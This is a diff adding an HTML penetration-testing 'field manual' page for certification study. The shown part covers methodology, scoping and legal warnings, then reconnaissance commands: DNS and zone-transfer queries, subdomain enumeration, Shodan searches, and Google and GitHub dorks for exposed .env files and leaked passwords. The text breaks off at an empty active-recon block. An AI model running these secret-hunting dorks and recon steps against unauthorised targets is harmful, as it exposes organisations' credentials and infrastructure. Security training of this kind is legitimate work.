@@ -1,0 +1,1575 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Penetration Testing — Field Manual</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=Oswald:wght@300;400;500;600;700&family=Source+Code+Pro:wght@300;400;500;600&family=Teko:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+/* ══════════════════════════════════════════
+   DESIGN SYSTEM — Classified Field Manual
+   ══════════════════════════════════════════ */
+:root {
+  --void:     #0a0a08;
+  --olive:    #1a1f0e;
+  --olive2:   #222810;
+  --olive3:   #2d3418;
+  --olive4:   #3a4220;
+  --field:    #4a5228;
+  --moss:     #5a6330;
+  --sage:     #7a8848;
+  --amber:    #c8a832;
+  --amber2:   #e8c840;
+  --amber3:   rgba(200,168,50,0.12);
+  --red:      #c83228;
+  --red2:     #e03828;
+  --khaki:    #b8aa80;
+  --khaki2:   #d8cab8;
+  --khaki3:   #f0e8d8;
+  --muted:    #6a7048;
+  --faint:    #4a5030;
+  --border:   rgba(122,136,72,0.20);
+  --border2:  rgba(122,136,72,0.40);
+  --border3:  rgba(200,168,50,0.30);
+  --stencil:  'Teko', sans-serif;
+  --typeface: 'Oswald', sans-serif;
+  --body:     'Special Elite', serif;
+  --mono:     'Source Code Pro', monospace;
+  --sw:       272px;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--void);
+  color: var(--khaki2);
+  font-family: var(--body);
+  font-size: 14px;
+  line-height: 1.75;
+  cursor: default;
+}
+
+/* Noise texture overlay */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='256' height='256'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4'/%3E%3C/filter%3E%3Crect width='256' height='256' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+  pointer-events: none; z-index: 0;
+}
+
+/* ══ SIDEBAR ══════════════════════════════ */
+.sidebar {
+  position: fixed; left: 0; top: 0; bottom: 0;
+  width: var(--sw);
+  background: var(--olive);
+  border-right: 2px solid var(--border2);
+  z-index: 200; overflow-y: auto;
+  display: flex; flex-direction: column;
+}
+.sidebar::-webkit-scrollbar { width: 3px; }
+.sidebar::-webkit-scrollbar-thumb { background: var(--border2); }
+
+.sb-classified {
+  background: var(--red);
+  padding: 8px 22px;
+  font-family: var(--stencil);
+  font-size: 13px; letter-spacing: .28em;
+  text-transform: uppercase; color: #fff;
+  text-align: center; font-weight: 600;
+}
+
+.sb-head {
+  padding: 24px 22px 20px;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+}
+.sb-head::after {
+  content: '';
+  position: absolute; bottom: -1px; left: 0; right: 0; height: 1px;
+  background: linear-gradient(90deg, var(--amber), transparent);
+}
+.sb-doc-num {
+  font-family: var(--mono); font-size: 9px;
+  letter-spacing: .18em; color: var(--muted);
+  margin-bottom: 8px;
+}
+.sb-title {
+  font-family: var(--stencil); font-size: 22px;
+  font-weight: 700; letter-spacing: .08em;
+  color: var(--amber2); line-height: 1.1;
+  text-transform: uppercase;
+}
+.sb-subtitle {
+  font-family: var(--typeface); font-size: 11px;
+  color: var(--muted); letter-spacing: .1em;
+  margin-top: 6px; text-transform: uppercase;
+}
+
+.sb-group {
+  padding: 14px 22px 4px;
+  font-family: var(--stencil); font-size: 10px;
+  letter-spacing: .28em; text-transform: uppercase;
+  color: var(--faint); border-top: 1px solid var(--border);
+  margin-top: 6px;
+}
+.sb-item {
+  display: flex; align-items: center; gap: 10px;
+  padding: 7px 22px; cursor: pointer; transition: all .15s;
+  border-left: 2px solid transparent;
+}
+.sb-item:hover { background: rgba(122,136,72,0.08); }
+.sb-item.active { border-left-color: var(--amber); background: var(--amber3); }
+.sb-n { font-family: var(--mono); font-size: 10px; color: var(--faint); min-width: 22px; }
+.sb-t { font-family: var(--typeface); font-size: 12px; color: var(--khaki); letter-spacing: .05em; }
+.sb-item.active .sb-t { color: var(--amber2); }
+
+/* Phase indicators */
+.sb-phase-bar {
+  margin: 10px 14px;
+  background: var(--olive2);
+  border: 1px solid var(--border);
+  padding: 10px 14px;
+}
+.sb-phase-title { font-family: var(--stencil); font-size: 9px; letter-spacing: .22em; color: var(--amber); text-transform: uppercase; margin-bottom: 8px; }
+.sb-phase-item {
+  display: flex; align-items: center; gap: 8px;
+  padding: 3px 0; cursor: pointer;
+  font-family: var(--mono); font-size: 10px; color: var(--muted);
+  transition: color .15s;
+}
+.sb-phase-item:hover { color: var(--amber2); }
+.phase-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+.pd-1 { background: var(--amber2); }
+.pd-2 { background: #6ab4e0; }
+.pd-3 { background: var(--red); }
+.pd-4 { background: #c06aff; }
+.pd-5 { background: #5ec97a; }
+.pd-6 { background: var(--amber); }
+
+.sb-foot {
+  margin-top: auto; padding: 12px 22px;
+  border-top: 1px solid var(--border);
+  font-family: var(--mono); font-size: 9px;
+  color: var(--faint); line-height: 1.9;
+}
+
+/* ══ MAIN ═════════════════════════════════ */
+.main { margin-left: var(--sw); position: relative; z-index: 1; }
+
+/* ══ HERO ══════════════════════════════════ */
+.hero {
+  background: var(--olive);
+  padding: 0;
+  border-bottom: 2px solid var(--amber);
+  position: relative; overflow: hidden;
+}
+.hero-stamp {
+  position: absolute; right: 48px; top: 50%; transform: translateY(-50%) rotate(-8deg);
+  border: 4px solid var(--red2); padding: 12px 20px;
+  font-family: var(--stencil); font-size: 42px; font-weight: 700;
+  color: var(--red2); letter-spacing: .18em; text-transform: uppercase;
+  opacity: 0.15; pointer-events: none; white-space: nowrap;
+  text-shadow: 2px 2px 0 rgba(0,0,0,0.5);
+}
+.hero-inner { padding: 52px 72px 44px; }
+.hero-doc-header {
+  display: flex; align-items: center; gap: 0;
+  margin-bottom: 28px; padding-bottom: 16px;
+  border-bottom: 1px solid var(--border2);
+}
+.hero-doc-num {
+  font-family: var(--mono); font-size: 10px;
+  color: var(--muted); letter-spacing: .15em;
+  flex: 1;
+}
+.hero-classification {
+  background: var(--red);
+  font-family: var(--stencil); font-size: 10px;
+  letter-spacing: .28em; color: #fff;
+  padding: 3px 14px; text-transform: uppercase;
+}
+.hero h1 {
+  font-family: var(--stencil);
+  font-size: clamp(38px, 6vw, 72px);
+  font-weight: 700; color: var(--amber2);
+  letter-spacing: .06em; line-height: 1.0;
+  text-transform: uppercase; margin-bottom: 6px;
+}
+.hero-subtitle {
+  font-family: var(--typeface);
+  font-size: 16px; color: var(--sage);
+  letter-spacing: .18em; text-transform: uppercase;
+  margin-bottom: 18px;
+}
+.hero-brief {
+  font-family: var(--body); font-size: 13.5px;
+  color: var(--khaki); max-width: 600px;
+  line-height: 1.8; border-left: 3px solid var(--amber3);
+  padding-left: 16px;
+}
+.hero-stats {
+  display: flex; gap: 0; margin-top: 36px;
+  border: 1px solid var(--border2);
+  width: fit-content;
+}
+.hs {
+  padding: 14px 24px; border-right: 1px solid var(--border);
+  text-align: center;
+}
+.hs:last-child { border-right: none; }
+.hs-val { font-family: var(--stencil); font-size: 30px; font-weight: 700; color: var(--amber2); letter-spacing: .04em; }
+.hs-lbl { font-family: var(--mono); font-size: 9px; color: var(--muted); letter-spacing: .14em; text-transform: uppercase; margin-top: 2px; }
+
+/* ══ SECTION ═══════════════════════════════ */
+.section {
+  padding: 52px 72px;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+}
+.section:nth-child(even) { background: var(--olive); }
+.section::before {
+  content: '';
+  position: absolute; left: 0; top: 0; bottom: 0;
+  width: 3px;
+  background: linear-gradient(180deg, var(--amber), transparent);
+}
+
+.sec-kicker {
+  display: flex; align-items: center; gap: 12px; margin-bottom: 8px;
+}
+.sec-num {
+  font-family: var(--stencil); font-size: 54px; font-weight: 700;
+  color: rgba(122,136,72,0.15); line-height: 1; letter-spacing: .04em;
+  flex-shrink: 0; margin-top: -6px;
+}
+.sec-tag {
+  font-family: var(--stencil); font-size: 10px;
+  letter-spacing: .28em; text-transform: uppercase;
+  color: var(--amber); border: 1px solid var(--border3);
+  padding: 3px 10px; background: var(--amber3);
+}
+.sec-title {
+  font-family: var(--stencil); font-size: 28px;
+  font-weight: 700; color: var(--amber2);
+  letter-spacing: .06em; text-transform: uppercase;
+  margin-bottom: 6px; line-height: 1.1;
+}
+.sec-brief {
+  font-family: var(--body); font-size: 13px;
+  color: var(--muted); max-width: 680px;
+  line-height: 1.75; margin-bottom: 32px;
+}
+
+/* ══ PHASE CARDS ════════════════════════════ */
+.phase-card {
+  background: var(--olive2);
+  border: 1px solid var(--border);
+  border-top: 3px solid;
+  margin-bottom: 20px; overflow: hidden;
+}
+.pc-recon   { border-top-color: var(--amber2); }
+.pc-scan    { border-top-color: #6ab4e0; }
+.pc-exploit { border-top-color: var(--red2); }
+.pc-post    { border-top-color: #c06aff; }
+.pc-report  { border-top-color: #5ec97a; }
+
+.pc-header {
+  display: flex; align-items: center;
+  gap: 0; cursor: pointer; user-select: none;
+}
+.pc-phase-num {
+  font-family: var(--stencil); font-size: 28px; font-weight: 700;
+  padding: 14px 18px; background: var(--olive3);
+  color: var(--sage); min-width: 60px; text-align: center;
+  border-right: 1px solid var(--border); line-height: 1;
+  letter-spacing: .04em;
+}
+.pc-info { flex: 1; padding: 12px 18px; }
+.pc-name {
+  font-family: var(--stencil); font-size: 17px; font-weight: 600;
+  color: var(--khaki2); letter-spacing: .08em; text-transform: uppercase;
+}
+.pc-desc { font-family: var(--typeface); font-size: 11px; color: var(--muted); letter-spacing: .06em; margin-top: 2px; }
+.pc-tags { display: flex; gap: 6px; padding: 12px 18px; flex-shrink: 0; align-items: center; }
+.pc-tag {
+  font-family: var(--mono); font-size: 9px; letter-spacing: .1em;
+  text-transform: uppercase; padding: 2px 8px; border: 1px solid;
+}
+.tag-a { color: var(--amber); border-color: var(--border3); }
+.tag-r { color: var(--red2); border-color: rgba(224,56,40,.3); }
+.tag-b { color: #6ab4e0; border-color: rgba(106,180,224,.3); }
+.tag-g { color: #5ec97a; border-color: rgba(94,201,122,.3); }
+.tag-p { color: #c06aff; border-color: rgba(192,106,255,.3); }
+.pc-chev { color: var(--faint); font-size: 12px; margin-right: 16px; transition: transform .2s; }
+.phase-card.open .pc-chev { transform: rotate(180deg); }
+.pc-body { padding: 22px 20px; display: none; border-top: 1px solid var(--border); }
+.phase-card.open .pc-body { display: block; }
+.phase-card.always .pc-body { display: block; }
+
+/* ══ CODE BLOCKS ════════════════════════════ */
+.code {
+  background: #060806;
+  border: 1px solid var(--border);
+  border-left: 2px solid var(--sage);
+  margin: 14px 0; overflow: hidden;
+}
+.code-bar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 7px 16px; background: var(--olive3);
+  border-bottom: 1px solid var(--border);
+}
+.cb-l { display: flex; align-items: center; gap: 10px; }
+.code-title { font-family: var(--mono); font-size: 10px; color: var(--muted); letter-spacing: .1em; }
+.code-lang {
+  font-family: var(--stencil); font-size: 9px; letter-spacing: .2em;
+  text-transform: uppercase; color: var(--amber);
+  border: 1px solid var(--border3); padding: 1px 8px; background: var(--amber3);
+}
+.copy-btn {
+  font-family: var(--mono); font-size: 10px; color: var(--faint);
+  background: none; border: 1px solid var(--border); padding: 2px 10px;
+  cursor: pointer; transition: all .15s; letter-spacing: .05em;
+}
+.copy-btn:hover { color: var(--amber2); border-color: var(--border3); }
+pre {
+  padding: 16px 20px; font-family: var(--mono); font-size: 12px;
+  line-height: 1.85; overflow-x: auto; color: var(--khaki);
+}
+pre::-webkit-scrollbar { height: 3px; }
+pre::-webkit-scrollbar-thumb { background: var(--border2); }
+.k  { color: var(--amber2); }
+.s  { color: #8ec97a; }
+.c  { color: var(--faint); font-style: italic; }
+.v  { color: #6ab4e0; }
+.f  { color: #c06aff; }
+.n  { color: var(--red2); }
+.t  { color: #e0a040; }
+.p  { color: var(--amber); font-weight: 500; }
+
+/* ══ DIAGRAMS ════════════════════════════════ */
+.diagram {
+  background: #060806;
+  border: 1px solid var(--border);
+  border-left: 2px solid var(--amber3);
+  padding: 18px 22px; margin: 14px 0;
+  font-family: var(--mono); font-size: 11.5px;
+  line-height: 1.85; overflow-x: auto;
+  white-space: pre; color: var(--khaki);
+}
+.dh { color: var(--amber2); font-weight: 600; }
+.dg { color: #8ec97a; }
+.dr { color: var(--red2); }
+.db { color: #6ab4e0; }
+.dy { color: var(--amber); }
+.dd { color: var(--muted); }
+.dp { color: #c06aff; }
+
+/* ══ CALLOUTS ════════════════════════════════ */
+.note {
+  border-left: 3px solid; padding: 12px 16px;
+  margin: 14px 0; font-size: 13.5px; line-height: 1.7;
+}
+.note-lbl {
+  font-family: var(--stencil); font-size: 10px;
+  letter-spacing: .26em; text-transform: uppercase;
+  font-weight: 600; margin-bottom: 5px;
+}
+.na { border-color: var(--amber); background: var(--amber3); }
+.na .note-lbl { color: var(--amber2); }
+.nr { border-color: var(--red2); background: rgba(224,56,40,.07); }
+.nr .note-lbl { color: var(--red2); }
+.ng { border-color: #5ec97a; background: rgba(94,201,122,.06); }
+.ng .note-lbl { color: #5ec97a; }
+.nb { border-color: #6ab4e0; background: rgba(106,180,224,.06); }
+.nb .note-lbl { color: #6ab4e0; }
+
+/* ══ TABLES ══════════════════════════════════ */
+.dt { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 13px; }
+.dt th {
+  background: var(--olive3);
+  color: var(--amber2); font-family: var(--stencil);
+  font-size: 11px; font-weight: 600; letter-spacing: .1em;
+  text-transform: uppercase; padding: 10px 16px; text-align: left;
+  border-bottom: 1px solid var(--border2);
+}
+.dt td { padding: 9px 16px; border-bottom: 1px solid var(--border); color: var(--khaki); vertical-align: top; }
+.dt tr:hover td { background: rgba(122,136,72,0.06); }
+.mc { font-family: var(--mono); font-size: 11px; color: #6ab4e0; }
+
+/* ══ GRIDS ════════════════════════════════════ */
+.g2 { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }
+.g3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; }
+@media(max-width:900px) {
+  .g2,.g3 { grid-template-columns: 1fr; }
+  .main { margin-left: 0; }
+  .sidebar { display: none; }
+  .hero-inner,.section { padding: 36px 24px; }
+}
+
+.mini {
+  background: var(--olive2);
+  border: 1px solid var(--border); padding: 15px 17px;
+}
+.mini h4 {
+  font-family: var(--stencil); font-size: 12px; font-weight: 600;
+  color: var(--amber); letter-spacing: .14em; text-transform: uppercase;
+  margin-bottom: 10px;
+}
+.mini p, .mini li { font-family: var(--body); font-size: 13px; color: var(--khaki); line-height: 1.7; }
+.mini li { margin-bottom: 4px; }
+
+/* ══ PAYLOAD BOX ══════════════════════════════ */
+.payload {
+  background: #060806;
+  border: 1px solid rgba(224,56,40,.25);
+  border-left: 3px solid var(--red2);
+  padding: 14px 18px; margin: 12px 0;
+  font-family: var(--mono); font-size: 11.5px;
+  line-height: 1.85; overflow-x: auto;
+  white-space: pre; color: #e09060;
+}
+.pl-lbl {
+  font-family: var(--stencil); font-size: 9px;
+  letter-spacing: .22em; text-transform: uppercase;
+  color: var(--red2); margin-bottom: 6px; display: block;
+}
+
+/* ══ PENTEST FLOW ════════════════════════════ */
+.ptflow {
+  display: flex; align-items: stretch;
+  gap: 0; margin: 20px 0; overflow-x: auto;
+}
+.ptf-step {
+  flex: 1; min-width: 90px;
+  background: var(--olive3); border: 1px solid var(--border);
+  padding: 14px 12px; text-align: center; position: relative;
+}
+.ptf-step + .ptf-step { border-left: none; }
+.ptf-step::after {
+  content: '▶';
+  position: absolute; right: -10px; top: 50%; transform: translateY(-50%);
+  color: var(--faint); font-size: 12px; z-index: 1;
+}
+.ptf-step:last-child::after { display: none; }
+.ptf-num { font-family: var(--stencil); font-size: 22px; font-weight: 700; color: var(--border2); line-height: 1; }
+.ptf-name { font-family: var(--stencil); font-size: 11px; color: var(--amber2); letter-spacing: .1em; text-transform: uppercase; margin-top: 4px; }
+.ptf-tool { font-family: var(--mono); font-size: 9px; color: var(--muted); margin-top: 6px; line-height: 1.5; }
+.ptf-step.active { background: rgba(200,168,50,0.1); border-color: var(--border3); }
+
+/* ══ MISC ═════════════════════════════════════ */
+p { margin-bottom: 10px; font-size: 14px; color: var(--khaki); }
+p:last-child { margin-bottom: 0; }
+strong { color: var(--khaki2); font-weight: 700; }
+ul,ol { padding-left: 20px; margin: 8px 0; }
+li { margin-bottom: 5px; font-size: 13.5px; color: var(--khaki); line-height: 1.7; }
+.mi { font-family: var(--mono); font-size: 11px; background: var(--olive3); padding: 1px 6px; border: 1px solid var(--border); color: #6ab4e0; }
+.tag-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px; }
+.tpill { font-family: var(--stencil); font-size: 9px; letter-spacing: .18em; text-transform: uppercase; padding: 3px 10px; border: 1px solid var(--border); color: var(--faint); }
+hr { border: none; border-top: 1px solid var(--border); margin: 22px 0; }
+
+/* ══ REDACTION ═══════════════════════════════ */
+.redact {
+  background: var(--void);
+  color: var(--void);
+  display: inline-block; padding: 0 4px;
+  user-select: none;
+}
+
+/* ══ SECTION DIVIDER ═════════════════════════ */
+.sec-divider {
+  display: flex; align-items: center; gap: 12px; margin: 24px 0;
+  font-family: var(--stencil); font-size: 9px;
+  letter-spacing: .28em; color: var(--faint); text-transform: uppercase;
+}
+.sec-divider::before, .sec-divider::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+@keyframes fadeIn { from{opacity:0;transform:translateY(12px)} to{opacity:1;transform:translateY(0)} }
+.section { animation: fadeIn .35s ease both; }
+</style>
+</head>
+<body>
+
+<!-- ═══════════════ SIDEBAR ═══════════════ -->
+<nav class="sidebar">
+  <div class="sb-classified">■ CLASSIFIED ■</div>
+  <div class="sb-head">
+    <div class="sb-doc-num">DOC-PENTEST-2024 // FIELD MANUAL</div>
+    <div class="sb-title">Penetration<br>Testing</div>
+    <div class="sb-subtitle">Deep Dive · Commands & Code</div>
+  </div>
+
+  <!-- Phase quick nav -->
+  <div class="sb-phase-bar">
+    <div class="sb-phase-title">Pentest Phases</div>
+    <div class="sb-phase-item" onclick="goTo('s2')"><span class="phase-dot pd-1"></span>Reconnaissance</div>
+    <div class="sb-phase-item" onclick="goTo('s3')"><span class="phase-dot pd-2"></span>Scanning & Enumeration</div>
+    <div class="sb-phase-item" onclick="goTo('s4')"><span class="phase-dot pd-3"></span>Exploitation</div>
+    <div class="sb-phase-item" onclick="goTo('s5')"><span class="phase-dot pd-4"></span>Post-Exploitation</div>
+    <div class="sb-phase-item" onclick="goTo('s6')"><span class="phase-dot pd-5"></span>Reporting</div>
+  </div>
+
+  <div class="sb-group">Foundations</div>
+  <div class="sb-item active" onclick="goTo('s1',this)"><span class="sb-n">01</span><span class="sb-t">Pentest Methodology</span></div>
+  <div class="sb-item" onclick="goTo('s2',this)"><span class="sb-n">02</span><span class="sb-t">Reconnaissance</span></div>
+  <div class="sb-item" onclick="goTo('s3',this)"><span class="sb-n">03</span><span class="sb-t">Scanning & Enumeration</span></div>
+
+  <div class="sb-group">Exploitation</div>
+  <div class="sb-item" onclick="goTo('s4',this)"><span class="sb-n">04</span><span class="sb-t">Exploitation</span></div>
+  <div class="sb-item" onclick="goTo('s5',this)"><span class="sb-n">05</span><span class="sb-t">Post-Exploitation</span></div>
+  <div class="sb-item" onclick="goTo('s6',this)"><span class="sb-n">06</span><span class="sb-t">Privilege Escalation</span></div>
+  <div class="sb-item" onclick="goTo('s7',this)"><span class="sb-n">07</span><span class="sb-t">Persistence & Pivoting</span></div>
+
+  <div class="sb-group">Specialized</div>
+  <div class="sb-item" onclick="goTo('s8',this)"><span class="sb-n">08</span><span class="sb-t">Web App Testing</span></div>
+  <div class="sb-item" onclick="goTo('s9',this)"><span class="sb-n">09</span><span class="sb-t">Active Directory</span></div>
+  <div class="sb-group">Output</div>
+  <div class="sb-item" onclick="goTo('s10',this)"><span class="sb-n">10</span><span class="sb-t">Reporting & Reference</span></div>
+
+  <div class="sb-foot">
+    classification: training use only<br>
+    topics: 10 · tools: 40+<br>
+    exam level: oscp / ejpt / pnpt
+  </div>
+</nav>
+
+<!-- ═══════════════ MAIN ═══════════════════ -->
+<main class="main">
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-stamp">TOP SECRET</div>
+  <div class="hero-inner">
+    <div class="hero-doc-header">
+      <div class="hero-doc-num">FM-3-37.64 // PENETRATION TESTING OPERATIONS // REVISED 2024</div>
+      <div class="hero-classification">TRAINING ONLY</div>
+    </div>
+    <h1>Penetration<br>Testing</h1>
+    <div class="hero-subtitle">Field Manual · Deep Dive · Commands & Code</div>
+    <p class="hero-brief">Complete operational reference covering the full pentest lifecycle — from scoping and reconnaissance through exploitation, post-exploitation, privilege escalation, pivoting, and professional reporting. Aligned with OSCP, eJPT, and PNPT certification requirements.</p>
+    <div class="hero-stats">
+      <div class="hs"><div class="hs-val">10</div><div class="hs-lbl">Phases/Topics</div></div>
+      <div class="hs"><div class="hs-val">40+</div><div class="hs-lbl">Tools Covered</div></div>
+      <div class="hs"><div class="hs-val">100+</div><div class="hs-lbl">Commands</div></div>
+      <div class="hs"><div class="hs-val">OSCP</div><div class="hs-lbl">Exam Level</div></div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════════════════
+     S1 · METHODOLOGY
+══════════════════════════════════════════════════ -->
+<section class="section" id="s1">
+  <div class="sec-kicker"><div class="sec-num">01</div><div class="sec-tag">Foundation</div></div>
+  <div class="sec-title">Pentest Methodology</div>
+  <p class="sec-brief">The structured framework that separates professional penetration testing from random hacking. Following methodology ensures repeatability, coverage, and legal protection.</p>
+
+  <!-- Full flow -->
+  <div class="ptflow">
+    <div class="ptf-step">
+      <div class="ptf-num">1</div>
+      <div class="ptf-name">Scoping</div>
+      <div class="ptf-tool">Rules of Engagement<br>Legal auth<br>Targets defined</div>
+    </div>
+    <div class="ptf-step active">
+      <div class="ptf-num">2</div>
+      <div class="ptf-name">Recon</div>
+      <div class="ptf-tool">OSINT<br>Passive info gather<br>whois/shodan</div>
+    </div>
+    <div class="ptf-step">
+      <div class="ptf-num">3</div>
+      <div class="ptf-name">Scan</div>
+      <div class="ptf-tool">Nmap<br>Port/service enum<br>Vuln scanning</div>
+    </div>
+    <div class="ptf-step">
+      <div class="ptf-num">4</div>
+      <div class="ptf-name">Exploit</div>
+      <div class="ptf-tool">Metasploit<br>Manual exploits<br>Initial access</div>
+    </div>
+    <div class="ptf-step">
+      <div class="ptf-num">5</div>
+      <div class="ptf-name">Post-Exploit</div>
+      <div class="ptf-tool">PrivEsc<br>Persistence<br>Lateral move</div>
+    </div>
+    <div class="ptf-step">
+      <div class="ptf-num">6</div>
+      <div class="ptf-name">Report</div>
+      <div class="ptf-tool">Findings<br>Risk ratings<br>Remediation</div>
+    </div>
+  </div>
+
+  <div class="g2" style="margin-top:20px">
+    <div>
+      <div class="mini">
+        <h4>Types of Penetration Tests</h4>
+        <table class="dt" style="margin-top:8px">
+          <tr><th>Type</th><th>Knowledge</th><th>Used For</th></tr>
+          <tr><td><strong>Black Box</strong></td><td>Zero info</td><td>Real attacker simulation</td></tr>
+          <tr><td><strong>Grey Box</strong></td><td>Partial (creds, arch)</td><td>Most realistic + efficient</td></tr>
+          <tr><td><strong>White Box</strong></td><td>Full (code, config)</td><td>Deep vulnerability analysis</td></tr>
+          <tr><td><strong>Red Team</strong></td><td>Zero — full adversary sim</td><td>Detection & response test</td></tr>
+          <tr><td><strong>Purple Team</strong></td><td>Collaborative red+blue</td><td>Improve detection together</td></tr>
+        </table>
+      </div>
+    </div>
+    <div>
+      <div class="mini">
+        <h4>Scoping — Rules of Engagement</h4>
+        <p><strong>Before touching anything, get in writing:</strong></p>
+        <ul style="margin-top:8px">
+          <li>Written authorization (Statement of Work)</li>
+          <li>Exact IP ranges / domains in scope</li>
+          <li>Out-of-scope systems (production DB, etc.)</li>
+          <li>Testing windows (no weekends? no peak hours?)</li>
+          <li>Emergency contacts + stop conditions</li>
+          <li>Data handling — screenshots, logs, reports</li>
+          <li>Physical access? Social engineering allowed?</li>
+        </ul>
+        <div class="note nr" style="margin-top:10px">
+          <div class="note-lbl">Legal Warning</div>
+          Unauthorized testing is a federal crime (CFAA in the US, Computer Misuse Act in the UK). Always test only within your authorized scope.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="note na">
+    <div class="note-lbl">Key Frameworks</div>
+    <strong>PTES</strong> (Penetration Testing Execution Standard) — most widely used. &nbsp;<strong>OWASP WSTG</strong> — for web apps. &nbsp;<strong>NIST SP 800-115</strong> — federal standard. &nbsp;<strong>MITRE ATT&CK</strong> — tactics and techniques reference for reporting.
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S2 · RECONNAISSANCE
+══════════════════════════════════════════════════ -->
+<section class="section" id="s2">
+  <div class="sec-kicker"><div class="sec-num">02</div><div class="sec-tag">Phase 1</div></div>
+  <div class="sec-title">Reconnaissance</div>
+  <p class="sec-brief">Intelligence gathering — passive and active. Passive recon leaves no trace on the target. Active recon touches the target's infrastructure.</p>
+
+  <div class="tag-row">
+    <span class="tpill">passive OSINT</span><span class="tpill">active recon</span>
+    <span class="tpill">footprinting</span><span class="tpill">attack surface</span>
+  </div>
+
+  <div class="phase-card pc-recon always">
+    <div class="pc-header">
+      <div class="pc-phase-num">2</div>
+      <div class="pc-info">
+        <div class="pc-name">Passive OSINT — No Target Contact</div>
+        <div class="pc-desc">Gather intelligence from public sources without touching target systems</div>
+      </div>
+      <div class="pc-tags"><span class="pc-tag tag-a">Passive</span></div>
+    </div>
+    <div class="pc-body">
+      <div class="g2">
+        <div>
+          <div class="code">
+            <div class="code-bar"><div class="cb-l"><span class="code-title">OSINT tools</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+            <pre><span class="c"># ── DOMAIN / DNS RECON ──────────────────────</span>
+<span class="f">whois</span> target.com                  <span class="c"># registration info</span>
+<span class="f">dig</span> target.com <span class="k">ANY</span>               <span class="c"># all DNS records</span>
+<span class="f">dig</span> target.com <span class="k">MX NS TXT</span>        <span class="c"># specific record types</span>
+<span class="f">dig</span> <span class="v">-x</span> <span class="s">1.2.3.4</span>                    <span class="c"># reverse DNS</span>
+<span class="f">host</span> target.com                   <span class="c"># quick DNS lookup</span>
+
+<span class="c"># Zone transfer attempt (often blocked)</span>
+<span class="f">dig</span> axfr @ns1.target.com target.com
+
+<span class="c"># ── SUBDOMAIN ENUMERATION ────────────────────</span>
+<span class="f">subfinder</span> <span class="v">-d</span> target.com <span class="v">-o</span> subs.txt
+<span class="f">amass</span> enum <span class="v">-d</span> target.com
+<span class="f">assetfinder</span> target.com
+<span class="f">dnsx</span> <span class="v">-d</span> target.com <span class="v">-a -cname</span>
+
+<span class="c"># ── EMAIL / PEOPLE OSINT ──────────────────────</span>
+<span class="f">theHarvester</span> <span class="v">-d</span> target.com <span class="v">-b</span> google,linkedin
+<span class="f">hunter.io</span>  <span class="c"># email format discovery</span>
+
+<span class="c"># ── GOOGLE DORKS ─────────────────────────────</span>
+site:target.com ext:pdf               <span class="c"># PDFs on domain</span>
+site:target.com inurl:admin           <span class="c"># admin pages</span>
+site:target.com "index of"            <span class="c"># dir listings</span>
+site:target.com filetype:env          <span class="c"># .env files!</span>
+"target.com" "password" site:pastebin.com
+intitle:"index of" inurl:target.com</pre>
+          </div>
+        </div>
+        <div>
+          <div class="code">
+            <div class="code-bar"><div class="cb-l"><span class="code-title">Shodan / Censys recon</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+            <pre><span class="c"># Shodan CLI (requires API key)</span>
+<span class="f">shodan</span> host <span class="s">1.2.3.4</span>               <span class="c"># host info</span>
+<span class="f">shodan</span> search <span class="s">"org:target"</span>          <span class="c"># org search</span>
+<span class="f">shodan</span> search <span class="s">"hostname:target.com"</span>
+
+<span class="c"># Shodan dorks (web interface)</span>
+org:"Target Corp" port:22           <span class="c"># SSH exposed</span>
+org:"Target Corp" http.title:"Admin"
+hostname:target.com product:nginx
+
+<span class="c"># ── GITHUB RECON ──────────────────────────────</span>
+<span class="f">trufflehog</span> github <span class="v">--org</span> target      <span class="c"># scan org repos</span>
+<span class="f">gitrob</span> target                        <span class="c"># find sensitive files</span>
+
+<span class="c"># Manual GitHub dorks:</span>
+<span class="c"># "target.com" password</span>
+<span class="c"># "target.com" api_key</span>
+<span class="c"># "target.com" secret extension:env</span>
+
+<span class="c"># ── WAYBACK MACHINE ───────────────────────────</span>
+<span class="f">waybackurls</span> target.com | grep <span class="v">-E</span> <span class="s">"\.php|\.asp|\.env"</span>
+<span class="c"># Find old endpoints, juicy parameters, backup files</span></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="phase-card pc-recon" id="pc-active">
+    <div class="pc-header" onclick="tog('pc-active')">
+      <div class="pc-phase-num">2</div>
+      <div class="pc-info">
+        <div class="pc-name">Active Reconnaissance — Direct Target Interaction</div>
+        <div class="pc-desc">Touching the target — be aware logs are generated</div>
+      </div>
+      <div class="pc-tags"><span class="pc-tag tag-r">Active</span><span class="pc-chev">▾</span></div>
+    </div>
+    <div class="pc-body">
+      <div class="code">
+        <div class="code-bar"><div class="cb-l"><span class="code-title">active recon techniques</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
